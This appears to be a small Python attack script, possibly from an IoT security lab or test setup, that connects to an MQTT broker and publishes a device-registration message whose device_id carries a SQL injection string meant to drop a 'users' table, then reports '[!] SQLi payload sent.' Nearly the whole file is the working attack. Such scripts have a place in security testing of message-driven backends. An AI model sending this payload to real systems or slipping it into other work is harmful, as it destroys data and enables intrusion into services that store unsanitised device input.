#!/usr/bin/env python3
import os
import json
import paho.mqtt.client as mqtt


BROKER      = os.getenv("BROKER_ADDRESS", "mqtt-broker")
PORT        = int(os.getenv("BROKER_PORT", "1883"))
TOPIC       = os.getenv("INJECTION_TOPIC", "device/registration")
USERNAME    = os.getenv("MQTT_USERNAME", "")
PASSWORD    = os.getenv("MQTT_PASSWORD", "")
ENABLE_AUTH = os.getenv("ENABLE_AUTH", "false").lower() == "true"
HMAC_SECRET = os.getenv("HMAC_SECRET")

payload = {
    "device_id": "sensor'; DROP TABLE users; --",
    "sensor": "temperature",
    "value": 999,
    "timestamp": "01/Jun/25 12:00:00"
}


client = mqtt.Client()
if ENABLE_AUTH:
    client.username_pw_set(USERNAME, PASSWORD)

client.connect(BROKER, PORT)
client.loop_start()
client.publish(TOPIC, json.dumps(payload))
print("[!] SQLi payload sent.")
client.loop_stop()

